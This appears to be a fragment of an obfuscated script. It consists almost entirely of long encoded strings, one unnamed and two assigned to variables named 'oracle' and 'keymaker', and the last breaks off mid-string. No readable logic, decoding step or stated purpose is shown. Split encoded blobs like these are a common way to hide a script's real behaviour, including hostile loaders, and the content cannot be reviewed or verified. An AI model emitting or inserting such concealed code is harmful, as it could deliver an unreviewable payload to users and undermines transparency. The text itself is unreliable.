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'
oracle = 'c0NzYzNzk2ODRmNjUzMDRjMzk1NDZjNGE0MTY0NjE2NjMxNzA1MTM3NTU0YzdhN2E3OTQ4NGY0NTM1NjY1MDY0NjU3MzM0MzczNjU0MzQzMDM2NzQ3YTQ0NDc2NjQ1MmI2OTMyNjM0ZDMwNTYyZjJmNTAzNzYyMmY1ODQ1NzM3Mjc5NjU2MzZmNzE0YjU2NmI1MzMzNTIzOTczMmY3MjQ4NDU2NTMwNTI2ZjQ1NTc0ZDRlNzI0ZjYxNDc0ODU1NTE3MjU3MmI3OTYzNTgzNTc5NGEzMTYyNDM2ZDZhMzU1NjM5Nzk3OTUxNDk3NDMyNWEzNDRkNGI0MzcxNmY2YjJmNWEzMDZhNzQ0NTc4Nzc0MjQxMzY3MTdhNjg2ZDc0Nzk1YTdhNjI0NTVhNDc2OTQzNGU1NzY3NzM0OTQxNTM2NzRhNTk0YTRiNDY1NTQzNGM1MTU1NGU3MjY1NDY3NDQ3NmE2NjcxNjU0NDcwNTgzNzUyNGI2ZDU5NmI1NDYzNTI2NzQ5MzE2ODYxNmI2NDZmNDE2ZDY3NmM2NDcxNjc2YTYzMzE3NDY2NTk0ZjcwNjI2ZDZhNzQ3YTQ1Nzk2YzRlNDU0NzM1NDE1ODU3NGMzNjU0NGQ0ZTMxNmY1MDU3Mzk3NTU1NjY0YjRhNGQ1OTc0MzE0Yjc0Nzc1NjU0NTEyYjM5N2E3OTRkNzI2ODY0NmE1MjU5NzU3MTQ0Nzg2ZjM0NjQ2MTM1Nzg2OTMxNDM2MjZlNTY2MzMwNDg3MDYxNGQ0OTU3NTI3MTU4NDI2ZjY1NTk0Nzc5MzU0NDc5NzA2YTQ3Njk2ODYzNTU3MzU4NGM1NDc4NTEzMDRmNjczNTYyNzI1NjcxNTczNjVhMzQ2ZjUzNTc2MjZkMzY3MjZjNDMyYjZmNGI3NDMzNmY0ODUyNTU3NjRlNmQ1MjRiNTU3YTM5Nzk3OTRkMzE2NzU3NDQ2MTJiNGM1NzJmNzg2Mjc0NGI2MTU5MzI3MDQ2Nzg1NzM1NzQ2MjcxNzQ3ODc5NmM0NzZhNDY1MTY4MzQ3YTc5Nzc2Yjc0NzU3NzYxNzQ1NzU1NTU3MDM0NzY2YjYyNTk1MzcwNGI0YzUzNjc2MjcxNzI1ODRlNzI1NDM5NTE1NTMxNGIzMDYyNmI0MzUyNzkzMDYzMmI2ZjZiNjY0YzdhNjM0MjM4NjE0MzQ1Nzc2YTUxMzA3NDRjNGM1NDU2NDY2MTU3NGY1NzJmNjU2NzZjNzA0YjY1NTA2NTY5NzM0MjQ2NTU1MDU2NDc0MzMwNjM1NzYyNGE3MjUzMzYzMDcwNmU1MDZmNDYzNjMxNzI3NDQxNTI0ZDYyNzQzODMxNjE0YTMyNDI3NTY5NzM1Njc0NjQ1NjQ0NTMzNTZiNzA2ODYxNDI1MTY3NTU0YjcwNTc2YTM4MzE1NzZmNjU2NzQ3MzY0NjMxNDM2MzZmNmE1NzZiNzE2NzRmNGU0MjM4NjE0MjMzNTM2ZDQyNGI1NTRmNzI1NDUzMzA1NzM3Nzg2ZDQyNzE0MzZjNmE3NTZmNmQ0YTRmNzk0ODM2NTk0ZDUxNmUzNTUwNDM3MzU3N2E2ODUxNmU3MTQ5NTY2Zjc4NGU2MTY3MzA0Njc1NmMzODcyNzk2ODcxNjk2ODRiNmY3MTQ0NzkzMTU1NGIzMTQxMzc0OTUwNzQ2OTUzNmI2MTY5NzA3MTYyNjc2YzQ5NGM0MzY3NzQ1NDM5NDg1MzMyNjYzNDM5NjI1NzYxNjE2OTZiNGI0NTZjNjc2ODU5N2E1NTMxNTA1NjJiNGU3ODM2NWE3OTcxNmY3NzU4NzE2ZjUxNjM2ZTM2NjU0ZTZmNzA1NzZiNDM2NzZiMzI0NDY2NmY0ODY5NTYzMjQ0MmY3MDc0NjI2OTQxNmY3MzRkNTU1NjcyNGIzNzQ4NDg3MTc0MzA2NjcwNDY0Mzc4NDg3NDZiNjY2NzRiNDM2ZjRhNmI2MTZiNjk0YTU2NzQ3OTc3NWE2MzZmNWE3MTRiNTk1YTJiNTM3NTMzNjQ0NzYyMzI1MTM2NWE3MTZjMzQ3MjY1Nzc2NjUxNjE1NTQ4NDY0MjQ5NTk0YzY0NmM0YzcxNjk0MjQ0Nzc3MDQ3NmE1NTZmNDI0NzRhNmQ2MTZlNGQ0YjY5Njc0OTJiNTMzNzU0NjM0NjMwNzkzMTQxNjQ1NTQxNTY0NTZkMzA0NzQyNzQ3NTY4NTkzMTZmNDUzNDQyNTM2YTc0NTkzNzMwMzgyZjUxNmY2ZDU5NzE0ZTY1NDU0YTc0MzQ0YzUyMzg2NzU5NDY0ODRlNTI3MjcwNzM3MTY4NGU1NDc3Nzc0ZTUzNmM0NjQzNzg0MzU1NmY3MDY5NzA0YjQ0NmU1NDcxNzM1NDRkNjU3NTU5NTc0ZjQ2NzE0OTZjNTc3MTU2MzA3YTcyNTkzMzc0NDgyYjQyNTczNjY3NjY2MzcwNzQ0ZTZjNDEzMTZmNDE1MDQ5NGY3YTRmNWE1NTczNjk3NDc3Nzc2YTM3NDc2ODU2NTY2NzJiNzk3YTU1NjY0YTU4MmY2Nzc0Mzg0MTRjNTU1NTc1NDM0MTU2Njg2MjY4Njg0MzcyNGM0ZjZjNGMyYjU1NGI1NTUxN2E3NDM3NDQ3MzU4NGIzMjMzNzI2YTUzNmQ2YzRlNTA3NjRmNjY3MzQ0NzE1MDU3Njc3NDZmNDc3MTU3N2E0OTJiNTA1MzZlMzE3NzRhMmI0YTcxNjE0ZTRkNTE1MTQyMzE0NzY4NTE1MTU1NGQ3NTU1NmU2NDQxN2E2ZjQxNDI0MTM3MzI2NzYyNTk3NjM4NTg3NDUwN2E3OTZkNjU2ZDU4NDM2NzYzNTY3MDU5NTA3MzQ4MzE1MTY2NzQ0YzRjNzA0ZTMyMzczNTRkNmYzMDU5MzczNDRkNGI0MTc5NmY2MTRiNDQ0MTYxNTUzODcxNzc1NDM4Njg2ZTU2NmM1MTYxNDM1OTcyNmE3YTUwMzc0MTMxNGQzMDY5MzU2MjJiNmQ3NzY5NTA0ZDZlMzY0ZjZjN2E0MzMxNmUzMjQ3NDg0ZjY0Njg2MzcwMmY0YjcxNDI2NDMyNjc0YTZjNmY3MjYxNjE2ZjQzNGI2OTUyNWEzNzYxNTM3MDJmNjkzMDQxNTI3MTRjNDg0ZjY3Njk2YjRhNmI2NjZmNjU0YzY1NDM2MTRiNjE2YzRiMzMzOTc5NzE0MjYzNTc0NDRiNTM2NzQ0NzE0MzRmNzk1YTcyNzE2ZjYxNmUzMzQzMzczOTZkNzY2NzU0NzQ2ZjQ5NTE1MDMzNGI1Mjc4N2E0ODQ1NDY3MjQ2MzM1MTUwMzk2ZjY0MzUyYjM2NTM2ZjM3NzY2NzcxNjc0ZDU1NzQ1YTMwNTg0NjQxNGQzNjQ0Nzc2NzRkMzk2Mzc5NzU1MzcxNTc3NzUzNjM2ZDRlMzc0MTQzMzY1NjU0NGI0ODQzMzMzNTdhNzA1NjJiNTgzODc4NGY0ZjVhMzQ3ODJiNmY2YTZiN2E0MjM0NTM3MzUxNzA2ZDcwMzE0MTM4MmI1YTU1NzM2NzU1NjU3MTU5NGI0OTMxNTk3NzJmNjk2OTcxNDE0MzY4NDE2YTQ4MmI0ZTU2NDY1MTMyNjI3MTMyNDQ2MzY3NTg3MTMwNDMzODM2NGU3OTY4NTc0ODRjMmY2ZDRhMzMzNjY5Nzg2MzZlMzQ2OTc4NTkzNjc0MzY2YTcyNDM3MDU0NjI2OTUzNmM3MTc3NDI2ZDMwNTk0NzY2NDU1OTM3NjE2NjQzNjY0NzUxMzkzMTUwMmY2Zjc2NDE3NzY4NTY3ODZhNTM2ZDc5NzE3MjZjNzc3NzZjNWE0ZTc0NDE1MzMzMzc1NDRjNTc1MzczNTQzNjRmNmQ3ODY3NDgzMTQ1NDI1MTQ1NzQ0NTUzNjgyYjc3NWE0ZTMyNWE2YzYzMzU2MzZlNzI2YTRhNDY1NzRmNTAzNDcyNjEzNTJiNmQ0MzZmNjU1NzQ5NjEzNjYxNmY0NTM0NzgyZjUzNWE1NzYyNTYzNjQ5NTgyYjRiNmE3ODM2NmY0OTYxNDI2MTM0MmI3MDQ1NjY0NjVhNTg1NDczNjk0ZjUxNTA1MTQyNTA2YTQyNjQzNzQ0NmIyYjM0Mzc3MzQ0NjYzNTM0NTY3NDU5MmYzODZkNTM2ZDc4MzI2MTJiNzI0NjQzNGU1NDM0NTM0ODc2NDI2ODU0NDQ1ODRlNDU1OTY3NDMzODQ3Mzg0MTY0MzQ0MzZkNmYzNjU3NzY2ZDQ5NGUyZjQ0NGM0MzQ2NTM2NzRhMzY1OTY4NTY2YzZkNjczMDZmNGI3NTQ0MzA3Mjc5NzE0MzY5NTk1NTZkNGU2MzQyNjI1NzQzNGI1MTY1Nzc1NzM4NDgzMDQ3NzE2MjUxNGQ2MTU1NTIzMTQ0NjkyYjQ5NzE0MjZmMzE2MTQxNDc1OTYxMzg3MDU1Nzc3MTU5NWE3MjVhNmEyZjc3NjEyYjRkNTk1NzUxMzU0ZDc5NzQzODUzNmU2ZTRiNzk2NjQxNTc1NjQxNGU2NzQyNzU1MzcxNjU0NDYzMzI2YTYxNTE1MDM4NDgyZjU5NDU2MzUyNTUzNTQ3MzI1NDQzNTY0MjY2NDk1NjM5NDkyYjM2NDEzNDZmNDczNDU2Njk3MTRiMzY0MTc5NGI0ZjUwNTM0NTZlNDE2NDM0NTM0ODQ4NDE1MTM0NzM2MzMxNGI0OTRiNzU0YjU0NmYzMDM2NDE0NTZmNGU1NzUwNGY0ZjcyNjg0ZDM5NGU3MjRlNGM1NTJiMzA0ZTQ0MzQ1MzY3NDQ0NjU1NjY2NzZlMzc0MTUwNTUzMTU1NmE2YzYyNzg3ODY2NjY2YzQ1NTc2NTU0MzU1NDU1NTY1MzQyMzQzNzZhNzE0MTc2NmI2YTYyNzA1NDMwNDg2YzcyMzI0YTY1NjQ1NDMwNDE3NDU0MzI2ZDY1NmQzMDQzMzY1YTcxNmMzMDdhNzA1ODdhNmQ3NTQ3NTEzNDRiNmMyZjQ0NmM1OTQ0MzA0ODc5NjczMTRkMmI2NTUwNGU1NjRmNTE2YzUwMzg0MTZlN2E2OTJiNDk2ODM2NDE0OTcyNGY0NjUwNDI3NDQ2NzM1MTQ1MzEzNzZiNmI2ODMxNTI2YzZlNmQ1MjRjNDM2YzQ0MmY2ZjQxMzU1MTM4NTUzMTQ1MzY1MzZiNTgzOTM5NWE2YTY5Njk1ODZkNTE0ZTMwMzUzODRhNjE1MjZkMzY2YTY2Nzk0MzVhNGE2NjcwNDM2ODM5NzM0MTU3MzI1OTMxNzc1NjY3Njk1Nzc5NzYzNDQ2NTM0NDYyNzY2ZTc2NDE3MjZhNGQ3MzU1MmI1MjYyN2E2ZDcxNzg3MTU0NmY2ODZlNDc2OTY3NGI2ODM4NDI2NjM1Nzk3MTU0Nzk1NzM2NmQ3NTUxNmE0NjU2NDIyZjUxNmM3MzY3NTcyYjQxNmI0NjM3NTE1YTM2NDc3MTc5NGI0OTQxNzk2ZTZlNTIzNDcwNTM3ODc4NTM1MjY3NzEyZjZkNzM0ODM3NmU1ODRlNmI3NzU4NzgzMjQxNmE2ZTQzNmM0YTc3NGU2YzQ0NmU2ZTM1NmQ2MTZiNjkyZjQ2Nzk2YzcxNGM0YzQ5NDQzOTRlNjY2YzQyNGM2YjYyNDg3OTZjMzU2ZjZiNmE2YjY5NmM0MTQ1NmUzNDM1NGQyZjU1NGY2YzQzNmE2YjcyNzg0ZTU0NGM0YTZiNDM3YTQyNTI3YTU1NGQ0MzQyNmYzMDc5MzkzMzM2NTc0YjQ5NzM0YTMyNDIzMDZmNDg1NTc5MzI3MjZkNjYzMzU0NDEzNTU1NTUzNjc3NGQzMTY4NGIyYjU5NTE2MjM4NjE1NTc3NzE1YTJiNjc1YTM3MzQ0YjczNGYzNjczNmY0MjU1MzM2YjZiNTUzMTc3NTk0YTMyNzY0Zjc3MzA0MzQ2NDI0OTU2NGM1OTc3NzE2NDdhNTg2OTRkNGI3NzM0NTQzODczNTU2MzY1NmQ1NjJmNmI2OTcxNmU1OTQ5NmY0YjU1MmI1ODRmN2EzMzcwNDI1ODYyNmM2ODUwNGQ0NzU2NDc3MTc3NDgzMTQ1NzYzNDQxNjE2YTY5NzU0MTcxNDE2NjQ0NDY2ZTY2MzI2NjRiNDU0YjM4N2E1NTMzNmI1MzJmNGM0NjZkNjE2OTQzNmY1OTU0NzI3OTRlNGQzNzZlNjEzNzM0Nzk0MjRhNzg2NDRkNDMzMjRmMmY1MTY4MmIyYjYzNTE0NjZjNmE0Zjc1NDI3NTQ4NzE0MjJiNjU3YTQyNzQ0ZTJiMmI0MTZmNTU0YjQ0NjQ0YjU4NmE3NDMxNGU2MzcyNjc0YjMzNTA0MTRiMzk2OTY4NmI2ODJmNzE0MzZjNTU2ZTY3NTM3MjRhMzg1MTQ0MzczNTdhNjczNjM4Nzg1NTRmNDczNzZhMzA3MTMxMzQ2ZjQ3NTMzOTc5MzE0NDQ2NGQ2ZTU3NDU0YjQ2Mzk2MzJmNjY0MzU3NmE2YzZlNzkzMTUxMzE0ODZlNDg0NTU2NzQ2MjYyNDQ3NTRhMzQ1NzQ5NGI2NTY1NDk3NTc4MmI0YjcxNzE1NDY5NzMzNjRjNTc1NTdhMzQ0NTRiNjg0ZTY2NTM2MTY4NzgzOTUxNzIzNTRjNTg0MTc2MzAzNTM5NTUzOTRmNjM1NjQxMzE0NDM2MzQ2YjYyMmI2ZjZhNTM0MzY1NzM2ODU4MzY2YjQxNmM1OTM0NmYzNDU4MzAzMzY5NTA0OTcyMzE0MjJmNzY2OTY2NGE1NTcwNTY0OTY4NzYzNjZiNzE2ODU1NDg2MTRhMmI2YzRhNjQ0ZTU5NDQyZjRiNzU3MjcyNzI1MDRhNDI3MDZjNGI2YTUwNzU1MTM4NTQzOTU2NzY1NDRhMzI3MzQ3NTMzODY3NzAzNDYyNzQzOTY1NmMzMzc1NDM3MTMzMzU2NTczNmM2NjUwNTg0YzU1NDg2OTRjNzU2NzVhNTgzMjZiNzE1NDRiNjI0NTQ4MzE0MjU3NmY1NTMzNDQ2YzQzMmY0NjU0NGI3MzZmMmYzMDM3MzM0YzJiNTU2YzRhMzEzNzZkNjU2NzYyMzI2NzUwNzA2ZjUyNzIzNjU0NDM1NzM0MzQzNzRhNjEzNzMyNTE0YzM2NmY1NzU2NTM2NTM2Njk0ODc2NTE3MDM1Njk3MTYyNjg3NTM4NDI1NTY5Njg1MzRmNDk1MTM3Njc2MTc3NjYzNDRmNjk2ZDdhMzU3MTdhMzY1YTMxNjQ1NzZkNWE3YTMzNGQ2NTUzMzc2OTRmNjE2OTQ4NmY0MjM2NzI2NTRjNmU2Yzc2NDY1NDY4NzI2MzQ5Nzg2OTc1MmI2MzY4N2E0YjRmNjE3MDc4NTA2NTMxNzc2NjRjNTA2ODcxNDQ0ODQxMzU0MjU3MzY2ODM3Njg0NzRiNzY2Zjc1MzY2ODYxNmU0MjQ0NzQ2NTMzNTg0YTY1NmQzMDRjNGU2YzcxNzU3NTQyNmY0YjcwN2E0ODUxNGE2MzMxNjg1Mzc1NjM3ODMxNzQ1MDRiMmY2ZDRiNGI2ZjZjNTUyZjVhNDE0NjVhNjU0YjY1NzUzODc4NGU1ODQ4NDIzOTUxNTY1NDU1Nzc1NjY2MzQ1ODcwNjU2NzVhNzU1NTJmNTM0YTY1NDM1NjU4NTA0ZDZiMzA2NjM4NTE3ODU4NTM1MTZhNzY0NzRhMzk3MDc2NTU3MjY2NzMzNzRhNTg3OTU4NTU0YzU4Mzg0ODY4NjEzNDUyNGQ2MTY2MzUzMTRhNTI1MDU1NjU2MTM3NzAzODcwNmQ3NjY4NDM3MDcxNDc0ODQzNDEzODMyMzM1NTU0NTI1MjMzNTA1MDZkMzg0MzY3NDc0YjRlMzk2NTMzNjY0ZDU2NGEzODcwNTU1YTcyNDE0NjU4MzE0NzY4NjM3MDcwNzk3Mjc1NmQ2MzRjNjk2YTZjNTQ2ZTZmNDg1NDYyNDk2NjUxNmQzNjQ5MzgzMTM4Njg2ZTRmNTUzODQ2MzM3MzQ1NjY2NDRjMzQ2MTZiNmQ0OTJiMzI0MTU4MmY1MDU1NGY3NjcxNmEzNDU1N2E3OTczNDQ3NjM4MzQ2MjQ5NGQyYjYzNzI3ODUyNzg1ODU3NDE3YTQ4NmY0OTUzNmE2Mjc4NDQ1NTU4NzkzNTU0Njc0ZDQ2NDg2NTYzNzYyYjU2NTA3NjY2NDk1Nzc5NTY2YzY0NzM0ZDZjNDM2MjU0NWE1ODU4NGY1OTYxMzY2MTcwNjY3YTMxNTU1Nzc1MzczMTQ3MzM2MzUyMzM0OTU2NDY0YTMxMzE1MTc2MzE0ZDc1NzM0YjM5NjczOTRiNTA3NDY0NDY1NDQxNDg2ZDJmNTQ2NTQ5NTUzMDc3NTY1MjQ2MzUyYjM0NTM3NTM3NGU1MzY5Nzg2ZjQ4NjE1ODU4NDEzOTc4NzY3MzZlMzE0MTZhNDE0YTM2MzgzMjY1MzU3NzY0NGQzMzY0NjIzNDUzNjgyZjU3NGQzMjRkNjQ3YTZhNTA1MDUxNzYzNjU5NTQ2MzM4NzI3NTdhNTAzNzRjNzQ2NTcxNmY0ZjY3NmE2YTM0MzQ1NTUyNWE2YTZjNDE0ODMxNDY1NDQ1MzA2ZTc1NjU0ZDcxNDEzNjZhNmE2ZDcxNzE1MDZiNGQ1MDY4MzY2ODU4NmE0ODZjNGQ0MTU2NWE3OTdhNzM0YjY0NTI2ZTVhMzk3NzJmNmYyYjM2NjE0NzVhNjY1NjcwNTI1MTU1NDU2MTU4NzE3MTM2NDk0NjQ4NTc1MTM4Nzc0NDMyNmMzMDZjNjQ0ZDYzNDU1NjUyN2EzNzY2NTU1YTU0MzU1ODM5NTI3OTc5NmY0ZjUyNjgzMzQ5NjQ3ODc0NTIzNDdhNDEyZjcxNGY2ZDU0NGUzMTQ2NDQ2NzRjNGIzNzMyNDk1MzM2NzE3MTM2NjM2NTM0Nzk1MDc5NzE1OTZlN2E2MTM2NjE3NTM0NmY3MjZmNWE2NTU5NzI0YjQyMzc1NDM2NmE2YzY2MzM2MTU4NTA0ODQxMzUzMjZhMzY3NDZlMzY2ZTc4NDQzNTc5NzY0NDY2NDI1NTUxMmY3Mzc5MzEzNDM0NGM3YTQ0NzQ3MTMzNzk2ZTc2MzQ2OTczNTU3MzU2NTIzNjY3MzY2ODc1MmIzODY5NmU1NjQ2NTE2MTJiNDM2ZjZiNzI1ODUwNDMzNzY5MmY2ZDU1NDgzNjMwNGM0ZjQ2NGY3MDJiNDc2ODZlNTg0OTJiNmYzODU5NDM2Y'
keymaker = 'GEzAQH2AQZ2ZmD2AmL0AwL3BQLmAmL1AwZkAGL0Amp1AGZmZQDkATR3BQLlAzZ2ZmMuAQZ3ZmL2AwL0AwH3ATR1BGquZzL2MGDlAGL3BGH4AzH2LGMvATL3ZQH4AmpmZGHkATH1BQD0AGD0AQH2AQt1BQHkAwRmBQMvAQt3BGD2Awt2AwEyAmR1ZQMxAwZ0ZmHlAGV3ZwZlAmN1ZQEuAQx1ZQMuZzL2BQMxAwp0BGH3AmpmAGZ4AmL0BQEvAmD1BGHjAwt2ZwLlAQD0AwZ5ATRlMwH2AGHlMwLmAGNmZQDmAQt0MQLlAwZ2MwDmAmH1BQL2AQtmAQD3AwR2BGp1AwL0MQZmATVlLwZ1AmL0AQZkAGHmAwLlATVmZwp4A2R1BQZkAQV1AwplAGD3BGL3ATV3ZGpjAwH3ZQLkZmH1ZmMzAmLlMwL5AwZ2BGpkZmtmBQHjAwH1AGEwAwx2BGplAmp2LwMyAQxmBQp4AQH2AQD2ZmD1AwL0AGt3ZGD4AQR2LmL4AwRlMwD3AJRmZwplZzL1BQD1AwD3Amp2AwR3BQp3AGx1ZmZ3ZzLlLwHjZmVmZmp5ZmV2LmpkAzR3ZQL2AGD0ZGWvAwH2MwpjAmH0LwH3ZzV3ZQpkATD0ZmMyAQZmAQLmAQx1BGEwZmp2BQMxZmD2LwDlAwLmAwD4AmN3AmpmAQt2ZwZ5AwV1AGLkAmZ1AwH0AGp3LGp3AQp1AQD4ATL3ZQExAQH1ZwH5AmpmAmpjAGx2ZmLlAJR3AGEzATZ0AQL2AGx0AGLlAmx0BQp3AmDmBQD2ATL3ZmDkAGL3BGMyAQR2MQL2AGZmAQDlAmZ3AGL5AzL2ZwD3AGx0AGZ3AwV2LmMyZmp0AQZmAmxmBGZ2AmN3LGH4AQV2ZwLlAGR2ZGLmAQH1ZQDlAGN2ZmH0ZmZ3LGD4AzV0AGplZmL3AQIuAwp3AmpmZmp2BQD1AwV0BGH4AQZ3ZQp3ZmV1AmL3ZzVmAGpkAQD2BQplAGN2MGEwAGx0BGZ2AGx0AwZkZzL0AQp3AGV2MQIuAQpmBGpjZmN3AwIuAGt3AGp3AJR0AmpmAzD2ZwExATV1ZQp0Awx3Amp4Amt2MQZ4AJR3ZmZjAmt3LGp2ATV3AwEzATR1ZQMxAmZmZmH5ZzV2LGp3ZmD1BQZ0AQV0LGLkAwL0MQLkZmx2ZwHmAmt3AmZ0AGL0LmMxAmD0ZmZmAQR0MwLlAGH0AmpjZmR2ZmLmATH1LGEvAGN0MwMxAmZ2MGHkAwV2AwL3ATZ0AwZ0AGH0MGZ1AQD2MQDmAGD0ZGp1ATL0LwWvZzL3AGEvAGHmZwp5AGR0BQp2ZmNlMwp3AwHlLwD5ATV0AwD5AGZ0MwZ4ZmNmZwplAwp2LGMzAQL0BQHmATDlLwD0AmZmBGL1AmZmBQH0ZmZmAQL2AmH0ZwEuA2R3ZGD4AQV1LGWzAGx3ZQL1AwpmZmEzATH3BQL3AzL3LGD0AzZ3AQLkAQDmZmL3ZmH1AQEwZzL3ZmWvAQZ3LGL0Awx3AQp5AJR3AwHkAQZ0LmDkZmx2ZmHlAwD3AQH1ZmDmAQDlAGN0AQDmZmL2AQMuA2R0MGWvZmt0AQIuAmtmBGMzZmx3LGL2ZmH0MwZ1AwV2AmExZmD3Zmp1AQD2BQL3AwH0MQMxAQVmZmD0AmR3ZQD3AwZ2ZwZ2AmL3BQL1ZmN2MGquAwp3AwExAzH3ZQp5AGH0AGZlAmp0BQMwAzV0AQL5AmL2AGZ0AGt1BQZ3AmD0ZGZ5Amp2LwpkAQL1B